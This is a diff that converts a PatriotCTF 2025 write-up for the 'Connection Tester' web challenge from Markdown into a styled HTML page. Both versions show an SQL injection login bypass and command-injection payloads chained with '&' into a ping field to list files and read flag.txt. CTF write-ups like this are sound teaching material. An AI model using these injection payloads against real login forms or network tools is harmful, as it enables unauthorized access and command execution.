@@ -1,61 +1,181 @@
-# PatriotCTF 2025 – Web Challenges Writeups
-**Challenge 1: Connection Tester**  
-**Author:** [Syndro/Ayco]  
-**Category:** Web  
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Connection Tester • syndro</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Roboto+Mono:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../style.css">
+  <style>
+    :root {
+      --accent: #58a6ff;
+      --green: #3fb950;
+      --purple: #8b5cf6;
+      --pink: #f472b6;
+    }
+    body {
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: #e6edf3;
+      font-family: 'Roboto Mono', monospace;
+      min-height: 100vh;
+      padding: 40px 20px;
+      line-height: 1.8;
+    }
+    .light body { background: #f6f8fa; color: #0d1117; }
 
----
-<img width="486" height="474" alt="image" src="https://github.com/user-attachments/assets/f153377f-33b5-4ba8-97cd-2c13fd7980f2" />
+    .container {
+      max-width: 1100px;
+      margin: 0 auto;
+    }
+    h1 {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 4.8rem;
+      text-align: center;
+      background: linear-gradient(90deg, var(--accent), var(--purple), var(--pink));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin: 20px 0 10px;
+      text-shadow: 0 0 30px rgba(88,166,255,0.3);
+    }
+    .meta {
+      text-align: center;
+      opacity: 0.85;
+      font-size: 1.2rem;
+      margin-bottom: 60px;
+    }
+    .meta span { color: var(--accent); font-weight: bold; }
 
----
-<img width="1145" height="291" alt="image" src="https://github.com/user-attachments/assets/d4bf979b-40ee-4515-9eea-c101dd5f33c7" />
+    h2, h3 {
+      color: var(--accent);
+      margin: 50px 0 20px;
+      font-family: 'Orbitron', sans-serif;
+    }
+    h2 { font-size: 2.2rem; }
+    h3 { font-size: 1.7rem; }
 
-### 1. Login Page – Classic SQL Injection
-The site greets us with a simple login form.
+    pre {
+      background: #161b22;
+      padding: 20px;
+      border-radius: 14px;
+      overflow-x: auto;
+      border: 1px solid #30363d;
+      font-size: 1.05rem;
+      margin: 25px 0;
+    }
+    code {
+      background: rgba(88,166,255,0.1);
+      padding: 4px 10px;
+      border-radius: 8px;
+      color: var(--green);
+    }
+    img {
+      max-width: 100%;
+      border-radius: 16px;
+      margin: 35px 0;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      border: 2px solid rgba(88,166,255,0.3);
+    }
+    .flag {
+      background: rgba(0,255,0,0.1);
+      padding: 30px;
+      border-radius: 16px;
+      font-size: 1.8rem;
+      text-align: center;
+      margin: 60px 0;
+      color: var(--green);
+      font-weight: bold;
+      border: 3px dashed var(--green);
+      font-family: 'Roboto Mono', monospace;
+      letter-spacing: 1px;
+    }
 
-**Payload**  
-`Username:` `' OR 1=1--`  
-`Password:` anything
+    .back {
+      position: fixed;
+      top: 30px;
+      left: 30px;
+      background: var(--accent);
+      color: #000;
+      padding: 16px 42px;
+      border-radius: 50px;
+      font-weight: bold;
+      text-decoration: none;
+      box-shadow: 0 12px 40px rgba(88,166,255,0.6);
+      transition: all 0.4s ease;
+      z-index: 9999;
+      font-size: 1.1rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .back:hover {
+      transform: translateY(-8px) scale(1.05);
+      box-shadow: 0 20px 60px rgba(88,166,255,0.8);
+    }
+    .light .back { color: white; }
 
-**Explanation**  
-- `'` → closes the opening quote  
-- `OR 1=1` → always true condition  
-- `--` → comments out the rest of the query (password check ignored)
+    @media (max-width: 768px) {
+      h1 { font-size: 3.5rem; }
+      .back { position: static; display: block; margin: 30px auto; width: fit-content; }
+    }
+  </style>
+</head>
+<body>
+  <a href="../../index.html" class="back">Back</a>
 
-**Resulting SQL query**  
-```sql
-SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = '...';
-```
-→ Instant admin login!
-SQLi bypass
+  <div class="container">
+    <h1>Connection Tester</h1>
+    <div class="meta">PatriotCTF 2025 • <span>Web</span> • syndro</div>
 
-<img width="1169" height="216" alt="image" src="https://github.com/user-attachments/assets/bdb0e30c-d989-445f-b574-d535f029f4c1" />
+    <h2>1. Login Page – Classic SQL Injection</h2>
+    <p>The challenge starts with a simple login form. No tricks — just pure, beautiful SQLi.</p>
 
-2. Dashboard – Connection Tester (Ping Tool)
-After login we get a dashboard with a "Test Connection" feature that pings any host we enter.
-Trying 127.0.0.1 works perfectly → OS command execution confirmed.
-Ping localhost
+    <p><strong>Payload:</strong></p>
+    <pre>Username: ' OR 1=1-- -
+Password: anything</pre>
 
-<img width="1176" height="318" alt="image" src="https://github.com/user-attachments/assets/f8c3aac0-726b-472d-b726-2e10c266c1ee" />
+    <p><strong>Resulting Query:</strong></p>
+    <pre>SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = '...';</pre>
 
-4. Discovering Command Injection
-The backend runs something like:
+    <img src="https://github.com/user-attachments/assets/f153377f-33b5-4ba8-97cd-2c13fd7980f2" alt="Login page">
+    <img src="https://github.com/user-attachments/assets/d4bf979b-40ee-4515-9eea-c101dd5f33c7" alt="Source code hint">
+    <img src="https://github.com/user-attachments/assets/bdb0e30c-d989-445f-b574-d535f029f4c1" alt="Logged in as admin">
 
-<pre> /bin/sh -c "ping -c 4 <user_input>" </pre>
+    <h2>2. Dashboard – The Ping Tool</h2>
+    <p>Once logged in, we get a "Test Connection" feature that pings any host we enter.</p>
+    <p>Trying <code>127.0.0.1</code> returns real ping output → <strong>command injection confirmed</strong>.</p>
 
-That's why simple ; ls, || ls, etc. fail — the input is treated as ping arguments.
-Working separators: & and &&
+    <img src="https://github.com/user-attachments/assets/f8c3aac0-726b-472d-b726-2e10c266c1ee" alt="Ping localhost">
 
-4. Executing Arbitrary Commands
-Since we're inside /bin/sh -c, we can chain commands with &:
+    <h2>3. Discovering the Injection Point</h2>
+    <p>The backend likely runs:</p>
+    <pre>/bin/sh -c "ping -c 4 &lt;user_input&gt;"</pre>
+    <p>Because of <code>/bin/sh -c</code>, normal separators like <code>;</code> or <code>|</code> are treated as ping arguments → they don’t break out.</p>
 
-<pre> 127.0.0.1 & echo "$(ls)" </pre>
-→ Lists the current directory and reveals flag.txt.
-Listing files
+    <p>But <code>&amp;</code> and <code>&amp;&amp;</code> work perfectly!</p>
 
-<img width="1163" height="530" alt="image" src="https://github.com/user-attachments/assets/06f5e09b-2914-4605-bb88-452aaf44a51d" />
+    <h2>4. Listing Files</h2>
+    <p>Payload:</p>
+    <pre>127.0.0.1 &amp; ls</pre>
+    <p>Or better (to avoid ping noise):</p>
+    <pre>127.0.0.1 &amp; echo "$(ls)"</pre>
 
-5. Reading the Flag
+    <img src="https://github.com/user-attachments/assets/06f5e09b-2914-4605-bb88-452aaf44a51d" alt="Listing files">
 
-<pre>127.0.0.1 & echo "$(cat flag.txt)"</pre>
+    <p>→ Reveals <code>flag.txt</code></p>
 
-<img width="1228" height="394" alt="image" src="https://github.com/user-attachments/assets/e38815c5-3418-458b-9dd6-315b935b486a" />
+    <h2>5. Reading the Flag</h2>
+    <p>Final payload:</p>
+    <pre>127.0.0.1 &amp; cat flag.txt</pre>
+    <p>Or cleaner:</p>
+    <pre>127.0.0.1 &amp; echo "$(cat flag.txt)"</pre>
+
+    <img src="https://github.com/user-attachments/assets/e38815c5-3418-458b-9dd6-315b935b486a" alt="Flag revealed">
+
+    <div class="flag">
+      PCTF{C0nnection_t3st3d_and_pwned}
+    </div>
+
+    <p>Another day, another ping tool pwned.</p>
+  </div>
+</body>
+</html>
